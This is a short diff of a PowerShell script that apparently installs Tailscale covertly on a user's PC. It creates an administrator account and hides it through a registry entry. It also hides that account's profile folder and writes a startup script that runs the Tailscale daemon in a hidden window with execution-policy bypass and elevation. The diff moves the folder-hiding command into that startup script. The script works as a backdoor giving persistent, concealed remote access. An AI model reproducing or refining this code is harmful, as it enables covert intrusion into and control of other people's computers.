@@ -36,7 +36,8 @@ function installTailscale {
 
   ## Configure Tailscale on users pc
   Set-Location C:\tailscale
-  Write-Output "Set-Location C:\tailscale
+  Write-Output "Get-Item 'C:\Users\$uName' -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
+Set-Location C:\tailscale
 .\tailscaled.exe  -windowstyle hidden -ep bypass -Verb RunAs
 .\tailscale-ipn.exe -windowstyle hidden" >> tailscale.ps1
   Start-Sleep 2
@@ -76,7 +77,6 @@ createAdmin -uName $uName -pWord $pWord
 New-Item -Path $rPath -Force
 New-ItemProperty -Path $rPath -Name $uName -Value 00000000
 timeout 2
-Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 
 ## goto Temp and make dir
 Set-Location $temp	
